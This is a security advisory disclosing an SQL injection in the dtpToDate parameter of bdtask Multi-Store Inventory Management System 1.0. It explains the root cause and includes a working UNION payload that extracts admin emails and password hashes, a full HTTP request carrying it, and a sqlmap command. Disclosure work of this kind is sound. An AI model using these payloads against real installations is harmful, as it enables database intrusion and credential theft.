# CVE-PENDING: Bdtask Multi-Store Inventory Management System 1.0 - SQL Injection

## Vulnerability Information

| Field       | Detail                                     |
|-------------|--------------------------------------------|
| **Product** | Multi-Store Inventory Management System    |
| **Vendor**  | bdtask                                     |
| **Version** | 1.0                                        |
| **Type**    | SQL Injection (CWE-89)                     |
| **Author**  | Kevin Chiang                               |
| **Date**    | 2026-05-04                                 |

---

## Affected Component

- **File**: `application/modules/accounts/controllers/Accounts.php`
- **Function**: `accounts_report_search()`
- **Parameter**: `dtpToDate` (POST)

---

## Description

A SQL injection vulnerability was found in bdtask Multi-Store Inventory
Management System 1.0. It affects the function `accounts_report_search()`
of the file `application/modules/accounts/controllers/Accounts.php`.
The manipulation of the argument `dtpToDate` leads to SQL injection.
The attack may be initiated remotely. An admin-level account is required.

The root cause is direct string interpolation of user input into the SQL
query via CodeIgniter's Query Builder `where()` method without using
parameterized queries:

```php
// Accounts_model.php (simplified)
$this->db->where('VDate BETWEEN "'.$dtpFromDate.'" and "'.$dtpToDate.'"');
```

---

## Steps to Reproduce

### Environment

- OS: Ubuntu 22.04.5 LTS
- Web Server: Apache 2.4.18
- PHP: 7.0.5
- Test URL: `http://localhost:8080/multistore/`

### Steps (Browser — No Tools Required)

1. Install Multi-Store Inventory Management System v1.0 on a local
   XAMPP environment
2. Log in with an **admin** account
3. Navigate to: **Accounts → Account Reports → General Ledger** 
<img width="248" height="610" alt="image" src="https://github.com/user-attachments/assets/8e77e9ec-cd7a-4879-bc6b-33e791c16dff" />
4. In the report form, select any **GL Head** from the dropdown
5. Leave **Transaction Head** blank
6. Set **From Date** to `2020-01-01`
7. Set **To Date** to the payload below 
<img width="1848" height="803" alt="image" src="https://github.com/user-attachments/assets/94484786-0b0e-42a3-b527-54d570a3b012" />
8. Click **Search**

---

## Proof of Concept

### Payload — UNION-based (Credential Extraction)

Paste the following into the **To Date** field:

```
2099-01-01" UNION SELECT email COLLATE utf8_unicode_ci,0,0,password COLLATE utf8_unicode_ci,0,0,0 FROM user LEFT JOIN acc_transaction ON 0=1 WHERE "1"="1
```
<img width="1845" height="800" alt="image" src="https://github.com/user-attachments/assets/3b5baa42-527b-4faf-8399-74de0dff53b7" />

**Expected Result**: The report table displays admin email and
MD5 password hash from the `user` table.

> **Note**: `COLLATE utf8_unicode_ci` is required to resolve the charset
> mismatch between the `user` table (`utf8_general_ci`) and
> `acc_transaction` table (`utf8_unicode_ci`).
> `LEFT JOIN acc_transaction ON 0=1` satisfies CodeIgniter's
> auto-appended `AND acc_transaction.COAID IS NULL` condition.

### Vulnerable HTTP Request

```http
POST /accounts/accounts/accounts_report_search HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data
Cookie: ci_session=34aed0cbb0face00d858483e251c665da3fea947

cmbGLCode=40216&dtpFromDate=2000-01-01&dtpToDate=2099-01-01" UNION SELECT email COLLATE utf8_unicode_ci,0,0,password COLLATE utf8_unicode_ci,0,0,0 FROM user LEFT JOIN acc_transaction ON 0=1 WHERE "1"="1
```

---

### SQLmap Command

```bash
sqlmap -u "http://localhost:8080/accounts/accounts/accounts_report_search" \
  --data="cmbGLCode=40216&dtpFromDate=2000-01-01&dtpToDate=2026-05-04" \
  --cookie="ci_session=YOUR_SESSION_COOKIE_HERE" \
  --level=3 --risk=2 \
  --dbms=mysql \
  --batch --dbs \
  -p dtpToDate
```

---

## Impact

An authenticated admin attacker can:

- Extract all database contents including user credentials
- Retrieve MD5-hashed passwords for offline cracking
- Modify or delete arbitrary database records
- Potentially achieve OS-level file write via `INTO OUTFILE`

---

## Vendor Notification

| Date       | Action                     |
|------------|--------------------------- |
| 2026-05-04 | Vendor notified via email  |
| 2026-06-04 | Public disclosure deadline |

---

## References

- Vendor homepage: https://www.bdtask.com/
- VulDB submission: (pending)
